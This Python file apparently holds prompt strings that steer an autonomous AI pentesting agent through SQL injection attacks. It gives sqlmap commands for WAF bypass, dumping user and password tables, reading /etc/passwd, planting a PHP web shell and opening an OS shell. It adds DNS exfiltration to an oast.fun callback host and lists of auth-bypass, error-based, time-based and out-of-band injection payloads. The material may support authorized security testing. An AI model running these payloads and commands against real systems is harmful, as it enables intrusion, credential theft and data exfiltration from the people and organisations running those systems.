"""
RedAmon SQL Injection Prompts

Prompts for SQL injection attack workflows using SQLMap and manual techniques.
Covers detection, WAF bypass, blind injection, OOB DNS exfiltration, and post-SQLi escalation.

Inspired by PR #73 (Shafranpackeer/feature/sqli-attack-module).
"""


# =============================================================================
# SQL INJECTION MAIN WORKFLOW
# =============================================================================

SQLI_TOOLS = """
## ATTACK SKILL: SQL INJECTION

**CRITICAL: This attack skill has been CLASSIFIED as SQL injection.**
**You MUST follow the SQLi workflow below. Do NOT switch to other attack methods.**

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
SQLMap level: {sqli_level}  (1-5, higher = more payloads/injection points)
SQLMap risk:  {sqli_risk}   (1-3, higher = more aggressive tests)
Tamper scripts: {sqli_tamper_scripts}
```

**Always include in every `kali_shell` sqlmap call:** `--batch --random-agent`

---

## MANDATORY SQL INJECTION WORKFLOW

### Step 1: Target Analysis (execute_curl)

Send a baseline request to the target URL and capture the normal response:

1. Use `execute_curl` to make a normal GET/POST request to the target endpoint
2. Identify injectable parameters: query string, POST body, headers, cookies
3. Check response for technology hints:
   - `Server` header (Apache, Nginx, IIS → hints at OS and DBMS)
   - `X-Powered-By` header (PHP, ASP.NET, Java)
   - Error messages containing SQL keywords (MySQL, PostgreSQL, ORA-, MSSQL)
4. Note the normal response length and status code (needed for blind detection)

**After Step 1, request `transition_phase` to exploitation before proceeding to Step 2.**
This unlocks the full exploitation toolset and ensures findings are tracked correctly.

### Step 2: Quick SQLMap Detection (kali_shell, <120s)

Run an initial SQLMap scan to detect injection points and DBMS:

```
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent --level={sqli_level} --risk={sqli_risk} --dbs")
```

**If tamper scripts are configured**, add them:
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent --level={sqli_level} --risk={sqli_risk} --tamper={sqli_tamper_scripts} --dbs")
```

**For POST requests**, use `--data`:
```
kali_shell("sqlmap -u 'TARGET_URL' --data='param1=value1&param2=value2' -p param1 --batch --random-agent --dbs")
```

**For cookie-based injection**, use `--cookie`:
```
kali_shell("sqlmap -u 'TARGET_URL' --cookie='session=abc123' --level=2 --batch --random-agent --dbs")
```

Parse the output for:
- DBMS type (MySQL, MSSQL, PostgreSQL, Oracle, SQLite)
- Injectable parameters and injection type
- Whether a WAF/IPS was detected

### Step 3: WAF Detection & Bypass

If SQLMap reports WAF/IPS detection or you get 403/406 responses:

1. **Retry with tamper scripts** — effective combinations:
   - **Generic WAF**: `--tamper=space2comment,randomcase,charencode`
   - **ModSecurity**: `--tamper=modsecurityversioned,space2comment`
   - **MySQL WAF**: `--tamper=space2hash,versionedkeywords`
   - **MSSQL WAF**: `--tamper=space2mssqlblank,randomcase`
   - **Aggressive**: `--tamper=between,equaltolike,base64encode,charencode`

2. **Reduce detection surface**:
   - Add `--delay=1` to slow down requests
   - Add `--random-agent` (already default)
   - Try `--technique=T` (time-based only — stealthiest)

3. **Manual bypass via execute_curl** if SQLMap fails entirely:
   - Test with encoded payloads: `%27%20OR%201=1--`
   - Test with comment obfuscation: `'/**/OR/**/1=1--`
   - Test case variation: `' oR 1=1--`

### Step 4: Exploitation (based on detected technique)

**Error-based / Union-based** (fastest):
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent --dbs")
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent --tables -D database_name")
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent --dump -T table_name -D database_name")
```

**Time-based blind** (slow — may need background mode):
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent --technique=T --dbs")
```
If this exceeds 120s → use **Long Scan Mode** (Step 5).

**Boolean-based blind**:
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent --technique=B --dbs")
```

**Out-of-Band (OOB/DNS exfiltration)**:
When blind injection is confirmed but time-based is too slow or unreliable,
follow the **OOB SQL Injection Workflow** section below.

### Step 5: Long Scan Mode (if scan exceeds 120s)

For complex targets (blind injection, large databases), run sqlmap in background:

**Start background scan:**
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent [args] > /tmp/sqlmap_out.txt 2>&1 & echo $!")
```
→ Note the PID from the output.

**Poll progress** (run periodically):
```
kali_shell("tail -50 /tmp/sqlmap_out.txt")
```

**Check if still running:**
```
kali_shell("ps aux | grep 'sqlmap' | grep -v grep")
```

**Read final output when done:**
```
kali_shell("cat /tmp/sqlmap_out.txt | tail -200")
```

### Step 6: Data Extraction Priority

Extract data in this order (most useful first):

1. **Database version**: `--banner`
2. **Current user**: `--current-user`
3. **All databases**: `--dbs`
4. **Tables in target DB**: `--tables -D <database>`
5. **Columns**: `--columns -T <table> -D <database>`
6. **Dump sensitive data**: `--dump -T users -D <database>`

For targeted extraction (faster than full dump):
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent -D dbname -T users --dump --threads=5")
```

### Step 7: Post-SQLi Escalation (if possible)

Attempt these ONLY if initial exploitation succeeded:

**File read** (requires FILE privilege):
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --file-read='/etc/passwd'")
```

**File write** (requires FILE privilege + writable directory):
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php")
```

**OS shell** (requires stacked queries + high privileges):
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --os-shell")
```

**SQL shell** (interactive SQL access):
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --sql-shell --sql-query='SELECT user,password FROM users'")
```
"""


# =============================================================================
# OOB (OUT-OF-BAND) SQL INJECTION WORKFLOW
# =============================================================================

SQLI_OOB_WORKFLOW = """
## OOB SQL Injection Workflow (Blind SQLi with DNS Exfiltration)

**Use this when:** blind injection is confirmed, time-based is too slow or unreliable,
or WAF blocks inline output. Requires `interactsh-client` installed in kali-sandbox.

---

### Setting Up Interactsh Callback Domain

**Step 1: Start interactsh-client as a background process**
```
kali_shell("interactsh-client -server oast.fun -json -v > /tmp/interactsh.log 2>&1 & echo $!")
```
→ **Save the PID** from the output for later cleanup.

**Step 2: Wait and read the registered domain**
```
kali_shell("sleep 5 && head -20 /tmp/interactsh.log")
```
→ Look for a line containing the `.oast.fun` domain (e.g., `abc123xyz.oast.fun`)
→ **IMPORTANT:** This domain is cryptographically registered with the server.
   Random strings will NOT work — you MUST use the domain from this output.

**Step 3: Use the domain in OOB payloads**

**Option A — SQLMap DNS exfiltration (PREFERRED — handles everything):**
```
kali_shell("sqlmap -u 'TARGET_URL' --dns-domain=REGISTERED_DOMAIN --batch --random-agent --dbs")
```

**Option B — Manual DBMS-specific payloads via execute_curl:**

MySQL (Windows servers only — UNC path):
```sql
' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.DOMAIN\\\\a'))--
' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.DOMAIN\\\\a'))--
```

MSSQL (xp_dirtree — most reliable):
```sql
'; EXEC master..xp_dirtree '\\\\DOMAIN\\a'--
'; DECLARE @x VARCHAR(99); SET @x='DOMAIN'; EXEC master..xp_dirtree '\\\\'+@x+'\\a'--
```

Oracle (UTL_HTTP):
```sql
' AND UTL_HTTP.REQUEST('http://'||user||'.DOMAIN/')=1--
' AND HTTPURITYPE('http://'||user||'.DOMAIN/').GETCLOB()=1--
```

PostgreSQL (dblink/COPY):
```sql
'; COPY (SELECT '') TO PROGRAM 'nslookup '||current_user||'.DOMAIN'--
'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host='||current_user||'.DOMAIN')--
```

**Step 4: Poll for interactions**
```
kali_shell("cat /tmp/interactsh.log | tail -50")
```
→ Look for JSON lines with `"protocol":"dns"` containing exfiltrated data as subdomain
→ Example: `{"protocol":"dns","full-id":"5.7.38.abc123xyz.oast.fun"}` means DB version is 5.7.38

**Step 5: Cleanup when done**
```
kali_shell("kill SAVED_PID")
```
"""


# =============================================================================
# SQL INJECTION PAYLOAD REFERENCE
# =============================================================================

SQLI_PAYLOAD_REFERENCE = """
## SQLi Payload Reference

### Auth Bypass Payloads (login forms)
Use these with `execute_curl` to test login forms for authentication bypass:
```
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
" OR 1=1--
admin'--
admin' OR '1'='1
admin'/*
') OR ('1'='1
')) OR (('1'='1
' OR 'x'='x
1' OR '1'='1' -- -
' UNION SELECT 'admin','password'--
' OR 1=1 LIMIT 1--
' OR 1=1#
```

### WAF Bypass Encoding Quick Reference
| Technique | Example | Use When |
|-----------|---------|----------|
| Hex | `0x27` for `'` | Keyword/char blocked |
| CHAR() | `CHAR(39)` for `'` (MySQL) | Quotes blocked |
| CHR() | `CHR(39)` for `'` (Oracle/PG) | Quotes blocked |
| Comment | `S/**/ELECT` | Keyword blocked |
| Case | `sElEcT` | Case-sensitive WAF |
| Double URL | `%2527` for `'` | Single-decode WAF |
| Unicode | `%u0027` for `'` | Unicode-aware WAF |
| Null byte | `%00'` | Null-terminated parsing |

### SQLMap Tamper Script Quick Reference
| Script | Effect | Best For |
|--------|--------|----------|
| `space2comment` | Space → `/**/` | Generic WAF |
| `randomcase` | `RaNdOm CaSe` | Keyword filters |
| `charencode` | URL-encode all chars | Generic WAF |
| `between` | `>` → `NOT BETWEEN 0 AND` | Operator filters |
| `equaltolike` | `=` → `LIKE` | Operator filters |
| `base64encode` | Base64-encode payload | Content filters |
| `modsecurityversioned` | MySQL `/*!*/` comments | ModSecurity |
| `space2hash` | Space → `#` + newline | MySQL WAF |
| `space2mssqlblank` | MSSQL alt whitespace | MSSQL WAF |
| `versionedkeywords` | MySQL versioned comments | MySQL WAF |

### Error-Based Extraction (by DBMS)
- **MySQL**: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--`
- **MySQL alt**: `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--`
- **MSSQL**: `' AND 1=CONVERT(int,(SELECT @@version))--`
- **MSSQL alt**: `' AND 1=CAST((SELECT @@version) AS int)--`
- **Oracle**: `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM DUAL))--`
- **PostgreSQL**: `' AND 1=CAST((SELECT version()) AS int)--`

### Time-Based Detection (by DBMS)
- **MySQL**: `' AND SLEEP(5)--` or `' AND IF(1=1,SLEEP(5),0)--`
- **MSSQL**: `'; WAITFOR DELAY '0:0:5'--`
- **Oracle**: `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--`
- **PostgreSQL**: `' AND 1=(SELECT 1 FROM pg_sleep(5))--`
- **SQLite**: `' AND 1=randomblob(500000000)--`
"""
